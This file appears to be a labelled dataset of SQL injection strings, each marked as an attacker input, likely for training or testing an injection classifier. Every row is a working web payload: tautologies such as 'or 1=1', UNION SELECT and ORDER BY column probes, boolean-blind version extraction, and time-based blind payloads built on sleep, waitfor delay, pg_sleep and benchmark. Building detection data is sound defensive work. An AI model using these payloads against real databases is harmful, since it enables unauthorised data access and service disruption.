Payload	Attacker
`	1
""""""	1
\\	1
'or 1=1;--  	1
""" OR 1 = 1 -- -"	1
'=0--+	1
'''''''''''''UNION SELECT '2	1
||	1
AND 1	1
1-false	1
1' ORDER BY 1--+	1
1' ORDER BY 1,2,3--+	1
-1' UNION SELECT 1,2,3--+	1
1 AND (SELECT * FROM Users) = 1    	1
%2c(select%20*%20from%20(select(sleep(10)))a)	1
-- -	1
OR 1=0	1
OR 1=0#	1
OR 1=0-- 	1
OR 3409=3409 AND ('pytW' LIKE 'pytY	1
HAVING 1=0#	1
AND 1=0	1
AND 1=0#	1
AND 7506=9091 AND (5913=5913	1
AND 7300=7300 AND 'pKlZ'='pKlY	1
AS INJECTX WHERE 1=1 AND 1=0	1
AS INJECTX WHERE 1=1 AND 1=0--	1
WHERE 1=1 AND 1=0#	1
ORDER BY 2-- 	1
ORDER BY 6-- 	1
ORDER BY 10-- 	1
ORDER BY 14-- 	1
ORDER BY 18-- 	1
ORDER BY 22-- 	1
ORDER BY 26-- 	1
ORDER BY 30-- 	1
ORDER BY 3# 	1
ORDER BY 7# 	1
ORDER BY 11# 	1
ORDER BY 15# 	1
ORDER BY 19# 	1
ORDER BY 23# 	1
ORDER BY 27# 	1
ORDER BY 31337#	1
ORDER BY 4 	1
ORDER BY 8 	1
ORDER BY 12 	1
ORDER BY 16 	1
ORDER BY 20 	1
ORDER BY 24 	1
ORDER BY 28 	1
RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='	1
%' AND 8310=8310 AND '%'='	1
and (select substring(@@version,2,1))='i'	1
and (select substring(@@version,3,1))='X'	1
""" or sleep(5)#"	1
1) or sleep(5)#	1
""")) or sleep(5)="""	1
';waitfor delay '0:0:5'--	1
));waitfor delay '0:0:5'--	1
1 or benchmark(10000000,MD5(1))#	1
""") or benchmark(10000000,MD5(1))#"	1
')) or benchmark(10000000,MD5(1))#	1
' or pg_sleep(5)--	1
1)) or pg_sleep(5)--	1
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='	1
SLEEP(5)#	1
or SLEEP(5)	1
or SLEEP(5)='	1
benchmark(50000000,MD5(1))	1
or benchmark(50000000,MD5(1))--	1
pg_SLEEP(5)#	1
"'\"""	1
&&SLEEP(5)	1
'&&SLEEP(5)&&'1	1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)	1
+ SLEEP(10) + '	1
RANDOMBLOB(1000000000/2)	1
ORDER BY SLEEP(5)	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16	1
